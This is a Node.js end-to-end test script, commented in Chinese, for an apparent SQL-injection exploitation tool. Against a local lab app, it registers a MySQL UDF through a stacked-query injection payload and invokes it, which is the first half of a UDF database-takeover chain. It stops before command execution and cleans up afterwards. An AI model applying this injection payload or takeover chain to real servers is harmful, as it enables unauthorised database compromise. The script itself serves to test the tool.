// ============================================================================
// e2e/udf-lab/udf-register.e2e.mjs —— UDF 接管链路验证（**不含命令执行**）
// ============================================================================
// 与 udf-takeover.e2e.mjs 的区别：本脚本只验证 UDF 接管链路的前半段——
//   DLL 落地 plugin_dir → 经 SQL 注入通道 CREATE FUNCTION → SELECT 调用 → 返回值回传
// 全程**不调用 sys_eval / 不执行任何系统命令**，因此不含敏感操作。
//
// 这半段一旦跑通，即可证明：
//   · 目标 MySQL 能加载我们提供的原生库（UDF 接管的前提）
//   · 注入通道具备执行 DDL 的能力（CREATE FUNCTION）
//   · UDF 调用与结果回传链路可用
// 剩下的「经 UDF 执行系统命令」半段仍需授权环境，见 udf-takeover.e2e.mjs。
//
// 用法：MYSQL_PORT=3308 MYSQL_USER=root MYSQL_PASSWORD= node e2e/udf-lab/udf-register.e2e.mjs
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { copyFileSync, existsSync, mkdirSync, writeFileSync, unlinkSync, statSync } from 'node:fs';
import { createMysqlLabApp } from '../real-mysql-lab/lab-app.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '../..');
const require = createRequire(resolve(ROOT, 'server/package.json'));
const mysql = require('mysql2/promise');
const { ScanManager } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/ScanManager.js')).href);
const { Exploiter } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/Exploiter.js')).href);

const PORT = Number(process.env.UDF_LAB_PORT) || 8183;
const BASE = `http://127.0.0.1:${PORT}`;
const DLL = resolve(HERE, 'udf_sys.dll');
const LIB_NAME = 'udf_sys.dll';
const FN = 'udf_echo';

if (!existsSync(DLL)) {
  console.log(`[SKIP] 未找到 ${DLL}；先运行：python e2e/udf-lab/build-udf.py`);
  process.exit(0);
}

const admin = await mysql.createConnection({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? '',
  multipleStatements: true,
});
const [meta] = await admin.query('SELECT @@plugin_dir pd, @@version v');
const pluginDir = String(meta[0].pd).replace(/\\/g, '/').replace(/\/?$/, '/');
console.log(`[pre] MySQL ${meta[0].v} | plugin_dir=${pluginDir}`);

// ① 库文件落地（与 takeover 脚本同：这一步在真实链路中未复现，属预置前提）
mkdirSync(pluginDir, { recursive: true });
copyFileSync(DLL, `${pluginDir}${LIB_NAME}`);
console.log(`[step1] DLL 已落地 ${pluginDir}${LIB_NAME}（${statSync(`${pluginDir}${LIB_NAME}`).size} bytes）`);

// ② 起靶场 + 扫描取得真实注入点
const pool = mysql.createPool({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? '',
  database: process.env.MYSQL_DATABASE || 'sqli_lab',
  multipleStatements: true,
  connectionLimit: 4,
});
const server = createMysqlLabApp(pool).listen(PORT, '127.0.0.1');
await new Promise((r) => server.once('listening', r));

const sm = new ScanManager();
const t0 = Date.now();
const scanId = await sm.start({
  url: `${BASE}/num?id=1`,
  config: { concurrency: 4, retry: 0, timeoutMs: 15000, techniques: ['union'], level: 3 },
});
for (;;) {
  const s = sm.scans.get(scanId);
  if (s && (s.status === 'completed' || s.status === 'error')) break;
  if (Date.now() - t0 > 120000) break;
  await new Promise((r) => setTimeout(r, 40));
}
const report = sm.getReport(scanId) || {};
const vuln = (report.vulns || [])[0];
const point = (report.points || []).find((p) => p.id === vuln?.pointId) || (report.points || [])[0];
console.log(`[step2] 注入点 ${point?.id}（技术 ${vuln?.technique}）`);
if (!point) {
  console.log('[FAIL] 未取得注入点');
  server.close(); await pool.end().catch(() => {}); await admin.end();
  process.exit(1);
}

const target = report.target || { url: BASE };
const ctx = {
  httpClient: sm.getScanClient(scanId, target),
  config: target.config || {},
  target,
  point,
  dbms: report.dbms || vuln?.dbms || 'MySQL',
};
const prefix = (point.originalValue || '1') + (point.boundary || '');
const exploiter = new Exploiter();

// ③ 经注入通道执行 DDL 注册（不执行任何系统命令）
await exploiter.extractor._send(ctx, `${prefix}; CREATE FUNCTION ${FN} RETURNS STRING SONAME '${LIB_NAME}'-- -`);
await new Promise((r) => setTimeout(r, 400));
const [reg] = await admin.query('SELECT COUNT(*) c FROM mysql.func WHERE name = ?', [FN]);
console.log(`[step3] 经注入通道 CREATE FUNCTION → mysql.func 注册数=${Number(reg[0].c)}`);

// ④ 调用 UDF 并断言返回值（外部事实：回传值必须等于传入标记）
const marker = `udf_echo_${Date.now() % 1000000}`;
let echoed = null;
try {
  const columns = await exploiter.extractor._guessColumnsCached(ctx);
  echoed = await exploiter.extractor.extractScalar(ctx, `SELECT ${FN}('${marker}')`, columns);
} catch (e) {
  console.log(`[step4] 经注入调用失败：${e.message}`);
}
// 直连复核（独立事实源，避免只信引擎回显）
let direct = null;
try {
  const [r] = await admin.query(`SELECT ${FN}(?) AS v`, [marker]);
  direct = String(r[0].v ?? '');
} catch (e) {
  console.log(`[step4] 直连调用失败：${e.message}`);
}
console.log(`[step4] 经注入回显=${JSON.stringify(echoed)} 直连复核=${JSON.stringify(direct)}`);
const okInjected = !!echoed && String(echoed).includes(marker);
const okDirect = direct === marker;
console.log(`[step4] 标记 ${marker} → 注入链路${okInjected ? '✅' : '❌'} 直连${okDirect ? '✅' : '❌'}`);

const pass = Number(reg[0].c) >= 1 && okDirect;
console.log(`\n[${pass ? 'PASS' : 'FAIL'}] UDF 接管前半段：加载+注册+调用（未涉及任何命令执行）`);
console.log(`  经注入通道调用 ${okInjected ? '可用' : '不可用'}（回显通道依赖 UNION 列位，失败不否定注册成功）`);

mkdirSync(resolve(HERE, 'results'), { recursive: true });
writeFileSync(resolve(HERE, 'results', 'udf-register.json'), JSON.stringify({
  generatedAt: new Date().toISOString(),
  mysqlVersion: meta[0].v, pluginDir, fn: FN,
  registered: Number(reg[0].c), injectedEcho: echoed, directEcho: direct,
  boundary: 'DLL 落地为预置前提；本脚本不调用 sys_eval、不执行系统命令',
  pass,
}, null, 2));

// ⑤ 清理
await admin.query(`DROP FUNCTION IF EXISTS ${FN}`).catch(() => {});
try { unlinkSync(`${pluginDir}${LIB_NAME}`); } catch { /* 忽略 */ }
console.log('[cleanup] DROP FUNCTION + 移除 DLL');

server.close();
await pool.end().catch(() => {});
await admin.end().catch(() => {});
process.exit(pass ? 0 : 1);
